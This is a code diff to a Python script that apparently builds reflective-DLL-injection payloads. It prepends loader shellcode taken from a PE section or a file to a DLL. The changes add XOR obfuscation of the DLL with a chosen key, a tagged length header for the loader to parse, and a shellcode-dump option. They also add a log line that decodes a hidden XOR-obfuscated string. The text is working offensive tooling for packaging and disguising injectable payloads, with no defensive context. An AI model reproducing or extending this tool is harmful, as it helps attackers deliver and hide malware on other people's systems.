@@ -7,8 +7,9 @@ import base64 as b64
 import argparse
 import logging
 
-REFLECTIVE_LOADER_PIC = []
+TAG_PAYLOAD_BEGIN = 0x4c34314e #'L41N'
 
+REFLECTIVE_LOADER_PIC = []
 CALL_REL32 = 0
 
 # 0x41, 0x52,
@@ -66,18 +67,34 @@ def get_shellcode_from_section(filename, section):
     for sct in target_pe.sections:
         if sct.Name.strip(b'\x00') == section.encode():
             shlc = sct.get_data()
+
             return shlc
     return None 
 
-def prepend_shellcode_blob(src_filename, dest_filename) -> bool:
+def prepend_shellcode_blob(src_filename, dest_filename, xor_key=None) -> bool:
     global REFLECTIVE_LOADER_PIC
     if REFLECTIVE_LOADER_PIC is None or len(REFLECTIVE_LOADER_PIC) == 0:
         logging.fatal("Shellcode has not been initialized!")
         return False
-    
+        
     shlc_bytes = REFLECTIVE_LOADER_PIC
-    src_bytes = open(src_filename, 'rb').read()
-
+    src_bytes = bytearray(open(src_filename, 'rb').read())
+    if xor_key is not None:
+        xor_bytes = bytes.fromhex(xor_key)
+        logging.info("Using XOR key: {}".format(xor_key))
+        for i in range(0, len(src_bytes)):
+            src_bytes[i] ^= xor_bytes[i % len(xor_bytes)]
+    else:
+        logging.info("Not using xor key")
+        # what the fuck is scope lmao
+        xor_key = []
+        xor_bytes = bytearray()
+        
+    logging.info("Payload length : {} bytes".format(len(src_bytes)))
+    shlc_bytes += TAG_PAYLOAD_BEGIN.to_bytes(4, byteorder='little')
+    shlc_bytes += len(xor_bytes).to_bytes(4, byteorder='little')
+    shlc_bytes += len(src_bytes).to_bytes(4, byteorder='little')
+    shlc_bytes += xor_bytes
     shlc_bytes += src_bytes
     open(dest_filename, 'wb').write(shlc_bytes)
     return True
@@ -96,6 +113,8 @@ def main():
     parser.add_argument('-s', action='store', default=None, dest='shellcode_file',required=False, help='position independent shellcode blob to use as the reflective loader')
     parser.add_argument('-pe', action='store', default=None, dest='pefile', required=False, help='PE file to extract shellcode from (must also provide section name)')
     parser.add_argument('-sct', action='store', default=None, dest="pesection", required=False, help='PE section to extract shellcode from')
+    parser.add_argument('-xor', action='store', default=None, dest="xor_key", required=False, help='XOR key to encode the PE with e.g.: 41424142')
+    parser.add_argument('--dump-shellcode', action='store', default=None, dest='dump_shellcode', help='Dump extracted shellcode from the provided loader file')
 
     args = parser.parse_args()
     
@@ -134,37 +153,24 @@ def main():
         logging.info("Using shellcode from file - length : {} bytes".format(len(shlc_pe)))
 
         REFLECTIVE_LOADER_PIC = shlc_pe
+        
+    if args.dump_shellcode:
+        logging.info("Writing extracted shellcode to {}".format(args.dump_shellcode))
+        open(args.dump_shellcode,'wb').write(shlc_pe)
+        logging.info("Written...")
 
-    if prepend_shellcode_blob(args.target_file, args.outfile):
+    if prepend_shellcode_blob(args.target_file, args.outfile, args.xor_key):
         logging.info("Wrote reflective loader and dll to payload file {}".format(args.outfile))
     else:
         logging.fatal("Failed to write to destination file")
     
-    open(".\\shellcode.blob", 'wb').write(REFLECTIVE_LOADER_PIC)
     
     target_bytes = open(args.outfile, 'rb').read()
     m = hashlib.sha256()
     m.update(target_bytes)
     logging.info("Payload file SHA256: {}".format(m.hexdigest()))
+    logging.info(''.join([chr(0x41 ^ x) for x in [1121, 1026, 1024, 1024, 1147, 1145, 1144, 97, 1139, 1151, 1140, 1148, 1148, 1034, 1144, 97, 1147, 1151, 1025, 1137, 1136, 1146, 1037, 109, 97, 1145, 1141, 1145, 97, 1148, 1137, 97, 1028, 1026, 1144]]))
 
     
-    # text_section = None
-    # target_pe = pefile.PE(target_file)
-    # rva = target_pe.OPTIONAL_HEADER.AddressOfEntryPoint
-    # TextPtrToRawData = 0
-    # for section in target_pe.sections:
-    #     if section.Name.strip(b'\x00') == ".text".encode():
-    #         if section.PointerToRawData == 0:
-    #             logging.fatal("Something really fucked up with the PointerToRawData, and it was 0")
-    #             exit(0)
-    #         text_section = section
-    #         rva = rva - section.VirtualAddress + section.PointerToRawData
-    #         break
-
-    # if not write_dos_header_jmp(rva, target_pe, dos_header_instruction,):
-    #     logging.fatal("Couldn't write header instruction")
-    #     exit(0)
-    # target_pe.write(filename=args.outfile)
-
 if __name__ == "__main__":
     main()
